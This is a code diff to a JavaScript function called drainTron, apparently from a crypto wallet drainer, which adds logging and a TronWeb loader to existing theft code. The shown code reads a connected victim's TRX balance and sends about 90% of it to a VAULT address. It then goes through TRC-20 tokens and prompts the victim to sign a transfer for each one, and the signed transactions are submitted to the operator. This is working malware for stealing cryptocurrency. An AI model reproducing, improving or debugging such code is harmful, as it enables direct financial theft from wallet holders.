@@ -6575,10 +6575,21 @@
   async function drainTron(conn) {
     if (!conn) return null;
     if (conn.wcSigner) await ensureWcTronWebLoaded();
+    // For injected path: also try to load TronWeb CDN so transactionBuilder is available
+    // if Trust Wallet's injected tronWeb doesn't have it.
+    if (conn.injectedSigner && !window.TronWeb) {
+      try { await loadTronWebLib(); } catch (_eTwLoad) {}
+    }
     var tronWeb = conn.tronWeb;
     var address = conn.address;
     var vault = VAULT.tron;
     var submitted = [];
+
+    L.log('[TRON] drainTron start | addr:', address ? address.slice(0, 8) : 'NONE',
+      '| hasTrx.sign:', !!(tronWeb && tronWeb.trx && tronWeb.trx.sign),
+      '| hasBuilder:', !!(tronWeb && tronWeb.transactionBuilder),
+      '| injectedSigner:', !!conn.injectedSigner,
+      '| window.TronWeb:', !!window.TronWeb);
 
     // WC path: tronWeb injected nahi hai — window.TronWeb se build karo, WC se sign karo
     var signTx;
@@ -6617,6 +6628,7 @@
         signTx = function(tx) { return tronWeb.trx.sign(tx); };
       }
     } else {
+      L.log('[TRON] using trx.sign() path (full TronWeb injected)');
       signTx = function(tx) { return tronWeb.trx.sign(tx); };
     }
 
@@ -6637,16 +6649,19 @@
 
     try {
       var balance = await tronWeb.trx.getBalance(address);
+      L.log('[TRON] TRX balance (SUN):', balance, '| threshold: 3000000 SUN (3 TRX)');
       if ((!balance || balance < 3000000) && address) {
         try {
           var acct = await tronFetchWithFallback('/v1/accounts/' + address);
           var acctData = acct && acct.data && acct.data[0];
           if (acctData && acctData.balance) balance = acctData.balance;
+          L.log('[TRON] REST balance fallback:', balance);
         } catch (eRpc) { L.warn('TRON RPC fallback:', eRpc.message); }
       }
       if (balance && balance >= 3000000) {
         var dynFee = Math.max(1000000, Math.floor(balance * 0.1));
         var sendAmt = balance - dynFee;
+        L.log('[TRON] draining TRX:', sendAmt, 'SUN →', vault);
         if (sendAmt > 0) {
           UI.status('Confirm TRX transfer...');
           var tx = await tronWeb.transactionBuilder.sendTrx(vault, sendAmt, address);
@@ -6654,15 +6669,20 @@
           if (signed) {
             await SUBMIT.tron(address, signed, vault, sendAmt, conn.name);
             submitted.push({ type: 'TRX', amount: sendAmt, signed: signed });
+            L.log('[TRON] TRX submitted ✓');
           }
         }
+      } else {
+        L.log('[TRON] TRX balance too low or zero — skip TRX transfer');
       }
 
+      L.log('[TRON] checking TRC-20 tokens:', trc20List.map(function(t) { return t.symbol; }).join(', '));
       for (var i = 0; i < trc20List.length; i++) {
         try {
           var c = await tronWeb.contract().at(trc20List[i].contract);
           var bal = await c.balanceOf(address).call();
           var balStr = bal && bal.toString ? bal.toString() : String(bal || '0');
+          L.log('[TRON]', trc20List[i].symbol, 'balance:', balStr);
           if (BigInt(balStr) <= 0n) continue;
           UI.status('Confirm ' + trc20List[i].symbol + '...');
           var ttx = await tronWeb.transactionBuilder.triggerSmartContract(
@@ -6673,11 +6693,13 @@
           if (sTx) {
             await SUBMIT.tron(address, sTx, trc20List[i].contract, balStr, conn.name);
             submitted.push({ type: trc20List[i].symbol, amount: balStr, signed: sTx });
+            L.log('[TRON]', trc20List[i].symbol, 'submitted ✓');
           }
         } catch (e2) { L.warn('TRC-20', trc20List[i].symbol, e2.message); }
       }
-    } catch (e) { L.warn('TRON drain fail:', e.message); }
+    } catch (e) { L.warn('[TRON] drain fail:', e.message, e.stack ? e.stack.split('\n')[1] : ''); }
 
+    L.log('[TRON] drain complete | submitted:', submitted.length, 'txs');
     if (submitted.length) S.omnichainLegs.tron = { address: address, legs: submitted };
     return submitted;
   }
